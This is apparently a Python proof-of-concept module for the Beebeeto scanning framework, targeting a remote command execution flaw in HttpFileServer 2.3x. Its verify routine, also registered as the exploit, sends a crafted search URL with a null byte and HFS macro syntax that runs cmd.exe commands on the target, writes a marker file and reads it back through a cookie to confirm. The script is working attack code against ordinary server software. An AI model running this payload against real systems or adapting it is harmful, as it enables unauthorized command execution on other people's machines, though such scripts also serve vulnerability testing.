#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/ff0000team/Beebeeto-framework
"""

import re

import requests # 第三方库

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0007',
            'name': 'HFS(HttpFileServer)命令执行 POC',
            'author': 'Demon@FF0000TeAm',
            'create_date': '2014-09-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'HttpFileServer',  # 漏洞所涉及的应用名称
            'vul_version': ['2.3x'],  # 受漏洞影响的应用版本
            'type': 'Remote Command Execute',  # 漏洞类型
            'tag': ['HFS漏洞', 'HFS命令执行', 'Http-File-Server'],  # 漏洞相关tag
            'desc': 'HFS has a remote command execute vul.',  # 漏洞描述
            'references': ['http://www.securityfocus.com/archive/1/533429',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        exec_payload = "/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}"
        check_payload = "/?search==%00{.cookie|out|value={.load|res.}.}"
        attack_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Send Payload: ' + exec_payload
        s = requests.Session()
        s.get(attack_url+exec_payload, headers={})
        r = s.get(attack_url+check_payload, headers={})
        check_cookie = r.headers.get('set-cookie')
        if "123456test" in check_cookie:
            args['success'] = True
            args['poc_ret']['url'] = attack_url+exec_payload
            if args['options']['verbose']:
                print '[*] GET DATA: ' + check_cookie
            return args
        else:
            args['success'] = False
            return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run(debug=True))
